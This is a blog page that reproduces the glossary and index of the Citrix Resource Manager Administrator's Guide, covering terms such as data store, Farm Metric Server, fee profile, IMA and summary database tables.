Comma-separated values. A file format used as a portable representation of a database. Each line is one entry or record and the data fields in a record are separated by commas. Commas can be followed by spaces and/or tab characters that are ignored. If a field includes a comma, the whole field must be surrounded with double quotes. An administrator who is subordinate to a full administrator. Custom administrators cannot set up other administrator accounts and have only a subset of the permissions that a full administrator has. A Resource Manager server that writes data to, and reads data from, a summary database. A data store that centralizes configuration information about published applications, users, printers, and servers. Each server farm has a single data store. The system data source name stores information about how a client can connect to a database. It is used by a client to access a DBMS. In the case of Resource Manager, the client is the Database Connection Server. Database management system. A software interface between the database and the user. A DBMS handles user requests for database actions with provision for data security and integrity requirements.
custom administrator
Database Connection Server data store
data source name
DBMS
116
Resource Manager Administrator’s Guide
Go to Document Center
Farm Metric Server
This server interprets farm-wide metrics and then processes them as part of its summary data. Application count is an example of a farmwide metric. You can also have a backup Farm Metric Server. A set of rates to be charged for using different types of resources. Fee profiles are used for billing. An administrator who has full access to all the administrative functions and features of the server farm. Full administrators are the only administrators who are allowed to create or modify other administrator accounts. Citrix’s server-to-server infrastructure that provides robust, secure, and scalable tools for managing a server farm of any size. Among other features, IMA enables centralized platform-independent management, an ODBC-compliant data store, and a suite of management products that plug in to the Presentation Server Console. One of a series of measurable items for a server or application. You can select which metrics you want to monitor for a particular server. This occurs when Resource Manager is actively looking at the data on servers. A server or published application. An instance of a program that is being executed. An application that is not a MetaFrame Presentation Server published application but is still recognized by the Resource Manager system. A description of a database to a DBMS in the language provided by the DBMS. A schema defines aspects of the database, such as attributes (fields) and attribute parameters. To systematically eliminate old or unneeded information.
fee profile
full administrator
Independent Management Architecture (IMA)
metric
monitoring
object process Resource Manager application schema
purge
Go to Document Center
Appendix C Glossary
117
server farm
A group of servers that are managed as a single unit, and that share some form of physical connection and a single data store. A colored signal in the status display that shows the status of each metric. When a status icon in the display changes, an alarm condition occurs. An averaged calculation of metrics information recorded on a Resource Manager server once each hour. Summarized data is stored by a DBMS for reporting purposes. Coordinated Universal Time. UTC is the same time as Greenwich Mean Time (GMT), and is the reference time zone used for calculating world time zones.
status icon
summary data
UTC
Go to Document Center
119
Index
A
Acrobat Reader, requirements 10 alarms automatic alerts for 36 counter 31 instance 31 object 31 pausing notification of 36 watching for 35 alerts 36 configuring automatic alerts 36 email 37 MAPI email configuration 37 pausing 36 SMS (cell/mobile phone) 40 SMTP email 37 SNMP 40 when a server stops operating 36 applications reporting on use 57 selecting Count metric for 46 automatic alerts 36
D
data source name 21 definition 115 setting 22 setting for Microsoft SQL Server 22 setting for Oracle 23 data store definition 115 Database Connection Server configuring 24 definition 115 DBMS definition 115 installing onto a server 18, 21 requirements 18, 21 transaction log 52 default metrics 81 data store connection failure 82 logical disk 82 memory 83 network interface 84 paging file 84 processor 84 system 85 terminal services 85 default metrics set 82 dialog box Data Sources (ODBC) 22–23, 38 Microsoft SQL Server DSN Configuration 22 Oracle ODBC Driver Configuration 24 Summary Database Configuration 24
B
billing cost centers 70 domain users 70
C
cell/mobile phone (SMS) alerts 40 cost centers 70 counter, for metrics 31 CSV files definition 115 saving to 56, 69 custom administrator definition 115
E
email alerts 37 configuring in Resource Manager 39 creating a mail profile 38 MAPI Connection Server 38 Resource Manager Mail Service 38 errors fixing user identification/password conflict 74 missing summary report information 75 viewing Resource Manager server log files 74
120
Resource Manager Administrator’s Guide
Go to Document Center
metrics displaying using the Dashboard 77 Microsoft SQL Server DSN Configuration dialog box 22 mixed environments 73 modems (for SMS alerts) 40 monitoring definition 116 entire server farm 29 real-time 31 single server 29, 36
F
Farm Metric Server configuration 49 contacting 76 definition 116 fee profile 69 full administrator definition 116
G
gateways for SMS alerts 40
N
negative metric values 74 network interface metrics 84 Bytes Total/sec 84 new features 12
I
icons, meaning of 33 Independent Management Architecture, definition 116 installation changing location after installation 30 software requirements 17 instance, for metrics 31
O
object definition 116 object, for metrics 31 Oracle ODBC Driver Configuration dialog box 24
L
licensing 18 log file, server 33 logical disk metrics 82 % Disk Time 82 % Free Space 83
P
paging file metrics 84 % Usage 84 pausing alarms and alerts 36 performance monitor 41 process definition 116 Process Summary report 61 processes reporting on current 57 reporting on history of 61 processor metrics 84 % Interrupt Time 84 % Processor Time 84 profile for email alerts 38 purge definition 116 purging, summary database overview 47
M
MAPI email to configure 38 memory metrics 83 Available Bytes 83 Pages/sec 83 metric checking status of 35 configuring automatic alerts for 36 counter 31 Count, selecting applications for 46 default set of 81 definition 116 instance 31 issues to consider when selecting for summary database 45 negative values 74 object 31 selecting for summary database 46
R
real-time monitoring 31 Report Center 78 unexpected behavior 79
Go to Document Center
reports about current activity 56 about past activity 61 Billing, overview 69 creating using Report Center 78 Current Process 57 Current User 59 overview 56 Process Summary 61 saving 67 saving Billing 72 Server Snapshot 60 Server Summary 65 templates 56 User Summary 63 viewing saved Billing 72 viewing saved current and summary 67 Resource Manager application definition 116 Resource Manager Mail Service 38 Resource Manager server log, viewing 74 Resource Manager tab 28
Index
summary database DBMS supported 18 estimating size 54 growth management 54 ignoring specific times during the day 47 issues to consider when selecting metrics for 45 purging 47 size considerations 52 transaction log 52 turning off 26 turning on 25 Summary Database Configuration dialog box 24 summary database schema administrator configurable server metrics 94 application metrics 89 LU_APPNAME 100 LU_CLIENT 101 LU_FARMNAME 101 LU_INSTANCE 103 LU_LAUNCHER 103 LU_METRICCOUNTER 105 LU_NETDOMAIN 105 LU_OBJECT 106 LU_PATH 106 LU_PROCESS 107 LU_PROCESSNAME 108 LU_SERVER 108 LU_SERVERINF 110 LU_SERVERNAME 109 LU_USER 110 LU_WINSTATION 111 processes 95 SCHEMAVERSION 100 SDB_APPMETRICS 90 SDB_CLIENTHISTORY 91 SDB_EVENTLOG 93 SDB_METRICS 94 SDB_PROCESS 95 SDB_SCRATCH 111 SDB_SESSION 98 SQL data type mapping 114 string length table 113 support and look-up tables 100 user information 98 version control 100 Summary Database tab 24 suspending alarms and alerts 36 system metrics 85 Context Switches/sec 85
121
S
schema definition 116 server determining user capacity 68 monitoring single 36 reporting on recent activity of 60 server farm definition 116 server log 33 Server Summary report 65 SMS alerts 40 configuring 40 modems 40 SMTP email alerts configuring 36 SNMP alerts 40 to configure 41 status icon definition 117 status icons meaning of 33 summary data definition 117 ignoring specific times during the day 47
122
Resource Manager Administrator’s Guide
Go to Document Center
system requirements DBMS 18, 21 for email alerts 37 for SMS alerts 40 for SNMP alerts 40
T
tab Resource Manager 28 Summary Database 24 TAPI Servers 40 terminal services metrics 85 Active Sessions 85 Inactive Sessions 85 traps List of SNMP 40 troubleshooting 73
U
unexpected behavior 73 Report Center 79 uninstalling Resource Manager 20 User Summary report 63 users reporting on current 59 reporting on history of 63 UTC definition 117</li>
</ol>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/虚拟化_Citrix/">虚拟化_Citrix</a></li></span></span> | <span class="tags">Tagged <a href="/tags/虚拟化_Citrix/" class="label label-primary">虚拟化_Citrix</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:37"datetime="2014-03-07 09:54:37"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-虚拟化_Citrix--Resource_Manager_Guide/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-虚拟化_Citrix--Resource_Manager_Guide" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/92/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li class="active"><li><span class="page-number current">93</span></li><li><a class="page-number" href="/page/94/">94</a></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/161/">161</a></li><li><a class="page-number" href="/page/162/">162</a></li><li><a class="extend next" href="/page/94/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Site powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a>  update time: <em>2014-04-07 17:26:53</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
